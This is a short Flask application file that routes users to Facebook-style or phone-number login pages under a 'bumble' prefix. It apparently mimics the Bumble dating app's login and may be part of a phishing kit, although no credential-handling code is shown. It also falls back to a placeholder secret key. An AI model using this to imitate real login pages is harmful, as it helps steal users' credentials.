from flask import Flask, render_template, request, flash, redirect, url_for
from parameters.bumble import add_mod
import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

app = Flask(__name__)

# Use environment variable for secret key
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'your-secret-key-here')

# Register blueprints
app.register_blueprint(add_mod, url_prefix='/bumble')

@app.route('/')
def home():
    """Render the home page."""
    return render_template('home.html')

@app.route('/bumble', methods=['POST'])
def bumble():
    """Handle login method selection."""
    try:
        login_method = request.form.get("login")
        
        if not login_method:
            flash("Please select a login method", "error")
            return redirect(url_for('home'))
            
        if login_method == "fb":
            return render_template('fb.html')
        elif login_method == "number":
            return render_template('bumble.html')
        else:
            flash("Invalid login method selected", "error")
            return redirect(url_for('home'))
            
    except Exception as e:
        flash(f"An error occurred: {str(e)}", "error")
        return redirect(url_for('home'))

@app.errorhandler(404)
def page_not_found(e):
    """Handle 404 errors."""
    return render_template('view.html'), 404

@app.errorhandler(500)
def internal_server_error(e):
    """Handle 500 errors."""
    return render_template('view.html'), 500

if __name__ == '__main__':
    # Use environment variable for port, default to 5000
    port = int(os.getenv('PORT', 5000))
    # Use environment variable for debug mode, default to False in production
    debug = os.getenv('FLASK_ENV') == 'development'
    app.run(host='0.0.0.0', port=port, debug=debug)
